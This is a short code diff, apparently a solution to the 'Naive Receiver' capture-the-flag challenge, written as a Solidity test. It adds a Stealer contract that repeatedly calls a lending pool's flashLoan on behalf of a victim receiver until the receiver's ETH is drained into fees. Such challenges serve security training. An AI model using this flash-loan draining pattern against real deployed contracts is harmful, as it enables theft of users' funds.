@@ -48,7 +48,8 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
-
+        Stealer s = new Stealer();
+        s.steal(payable(address(naiveReceiverLenderPool)), address(flashLoanReceiver));
         /**
          * EXPLOIT END *
          */
@@ -60,5 +61,14 @@ contract NaiveReceiver is Test {
         // All ETH has been drained from the receiver
         assertEq(address(flashLoanReceiver).balance, 0);
         assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
+    }
+}
+
+contract Stealer {
+    function steal(address payable poolAddress, address victim) external {
+        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(poolAddress);
+        for (uint256 i = 0; i < 10; i++) {
+            pool.flashLoan(victim, address(pool).balance);
+        }
     }
 }
